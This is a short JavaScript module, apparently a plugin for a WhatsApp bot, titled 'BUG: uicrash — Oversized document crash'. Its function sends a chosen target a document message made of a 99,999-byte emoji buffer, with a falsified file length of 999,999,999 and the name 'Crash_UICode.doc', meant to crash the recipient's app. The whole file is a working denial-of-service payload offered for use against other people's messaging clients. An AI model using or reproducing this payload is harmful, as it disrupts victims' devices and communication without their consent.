// ============================================================
// BUG: uicrash — Oversized document crash
// Source: Tayyab — adapted
// ============================================================

export default {
  id: 'uicrash',
  name: 'UI Crash Doc',

  async execute({ sock, target }) {
    const buffer = Buffer.alloc(99999, '💥');

    await sock.sendMessage(target, {
      document: buffer,
      mimetype: 'application/octet-stream',
      fileName: 'Crash_UICode.doc',
      fileLength: 999999999,
      caption: '💣 UI Crash',
    });
  },
};